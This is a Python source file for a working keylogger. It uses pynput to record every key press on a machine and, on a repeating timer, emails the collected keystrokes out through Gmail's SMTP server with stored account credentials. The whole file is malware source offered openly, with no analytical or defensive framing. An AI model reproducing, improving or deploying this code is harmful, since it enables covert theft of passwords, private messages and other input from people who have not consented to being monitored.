import pynput.keyboard
import threading
import smtplib

class Keylogger:

    def __init__(self, timer: float, email: str, password: str) -> None:
        self.log: str = ""
        self.timer = timer
        self.email = email
        self.password = password
        print("Keylogger started")

    def process_keys(self, key: pynput.keyboard.Key | pynput.keyboard.KeyCode | None) -> None:
        try:
            char: str | None = key.char  # type: ignore[union-attr]
            currnet_key = char if char is not None else ""
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                currnet_key = " "
            else:
                currnet_key = " " + str(key) + " "

        self.add_to_log(currnet_key)

    def add_to_log(self, string: str) -> None:
        self.log = self.log + string

    def send_mail(self, email: str, password: str, message: str) -> None:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self) -> None:
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.timer, self.report)
        timer.start()

    def start(self) -> None:
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
